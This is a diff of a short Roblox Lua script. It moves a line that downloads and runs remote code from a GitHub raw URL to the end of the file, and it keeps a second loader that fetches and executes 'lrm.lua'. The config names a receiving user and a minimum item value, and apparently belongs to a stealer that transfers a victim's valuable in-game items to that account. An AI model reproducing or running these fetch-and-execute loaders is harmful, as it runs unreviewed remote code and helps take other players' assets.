@@ -1,5 +1,3 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/7teenscripts/loadingscrn/refs/heads/main/lua"))()
-
 _G.LRMConfig = {
     User = {'AcescyG'},
     min_value = 10000000,
@@ -12,3 +10,5 @@ _G.LRMConfig = {
 }
 
 loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/sleepyvill/script/refs/heads/main/lrm.lua"))()
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/7teenscripts/loadingscrn/refs/heads/main/lua"))()
